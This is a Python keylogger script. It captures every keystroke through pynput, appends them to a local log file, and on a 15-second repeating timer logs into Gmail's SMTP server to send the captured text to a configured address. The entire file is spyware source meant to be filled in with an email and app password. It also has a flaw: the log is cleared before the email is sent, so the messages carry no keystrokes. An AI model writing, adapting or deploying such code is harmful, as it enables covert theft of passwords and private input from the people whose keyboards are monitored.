import pynput.keyboard
import threading
import smtplib

log = ""


class Keylogger:
    def __init__(self, time_interval, email, password, log_file):
        self.log = "Keylogger started"
        self.interval = time_interval
        self.email = email
        self.password = password
        self.log_file = log_file
        self.timer = None

    def append_to_log(self, string):
        self.log += string

    def process_key_press(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            elif key == key.backspace:
                self.log = self.log[:-1]  # Remove last character from log
                current_key = ""
            else:
                current_key = " " + str(key) + " "
        self.append_to_log(current_key)

    def write_log_to_file(self):
        with open(self.log_file, "a") as f:
            f.write(self.log)
            f.write("\n")  # Optional: write a newline after each log entry
        self.log = ""

    def report(self):
        self.write_log_to_file()
        self.send_mail(self.email, self.password, "\n\n" + self.log)
        self.log = ""
        self.timer = threading.Timer(self.interval, self.report)
        self.timer.start()

    def send_mail(self, email, password, message):
        try:
            server = smtplib.SMTP("smtp.gmail.com", 587)
            server.starttls()
            server.login(email, password)
            server.sendmail(email, email, message)
            server.quit()
        except Exception as e:
            print(f"Failed to send email: {e}")

    def start(self):
        try:
            keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
        except KeyboardInterrupt:
            print("Keylogger stopped by user.")
            if self.timer:
                self.timer.cancel()
        except Exception as e:
            print(f"An error occurred: {e}")


if __name__ == "__main__":
    my_keylogger = Keylogger(15, "---email----", "your_app_password_here", "keylog.txt")
    my_keylogger.start()
